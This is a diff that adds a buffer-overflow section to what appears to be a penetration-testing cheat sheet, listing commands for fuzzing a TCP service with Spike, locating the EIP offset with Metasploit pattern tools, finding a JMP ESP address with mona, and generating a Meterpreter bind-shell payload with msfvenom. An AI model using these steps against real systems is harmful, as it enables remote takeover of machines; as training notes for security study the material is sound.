@@ -80,6 +80,25 @@
 
 #### 5.3 Webshell
     /usr/share/webshells
+
+#### 5.4 Exploit BOF
+    ##### 5.4.1 Fuzzing with spike 
+        ###### 5.4.1.1 Spike template
+            s_readline(); -- Receive data
+            s_string(" "); -- Send constante string
+            s_string_variable(" "); -- Send variable string
+        ###### 5.4.1.2 Start fuzzing
+            generic_send_tcp TARGET_IP TARGET_PORT test.spk 0 0
+
+    ##### 5.4.2 Identify Offset to EIP 
+        msf-pattern_create -l 4000 ==> Find content of EIP
+        msf-pattern_offset -l 4000 -q 386F4337
+    ##### 5.4.3 Find JMP address
+        !mona jmp -r esp 
+    ##### 5.4.3 Generate shell
+        msfvenom -p windows/meterpreter/bind_tcp RHOST=0.0.0.0 LPORT=4444 EXITFUNC=thread -a x86 --platform windows -b "\x00" -f python -v shellcode
+
+    
 ### 6.Post Exploitation
 
 #### 6.0 Internal Reconnaissance
